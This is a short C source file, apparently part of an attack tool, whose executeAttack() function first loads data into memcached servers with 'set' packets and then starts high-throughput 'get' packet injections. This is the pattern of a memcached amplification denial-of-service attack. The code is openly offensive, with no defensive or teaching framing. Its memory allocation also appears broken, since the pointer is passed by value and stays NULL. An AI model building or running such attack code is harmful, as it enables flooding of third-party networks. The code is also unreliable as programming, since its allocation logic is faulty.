#include "strix.h"
#include "executor.h"
#include "netbasic.h"

int * executeAttack( AttackPlan * plan )
{
  int *injectionId = NULL;
  
  memalloc( (void *)injectionId, plan->totalPlans, __func__);

  for(int i = 0; i < plan->totalPlans; i++){
    //Precisamos inserir os dados no memcached antes de iniciar o ataque
    if( !send_data(plan->atkPlans[i]->setPacket->packet_ptr, plan->atkPlans[i]->setPacket->size, (struct sockaddr *)plan->atkPlans[i]->setPacket->saddr) ){
      handle_fatal("Socket Error\n");
    }
  
    injectionId[i] = CreateInjection( plan->atkPlans[i]->getPacket, plan->atkPlans[i]->throughput );
    InjectionStart(injectionId[i]);
  }

  return injectionId;
}
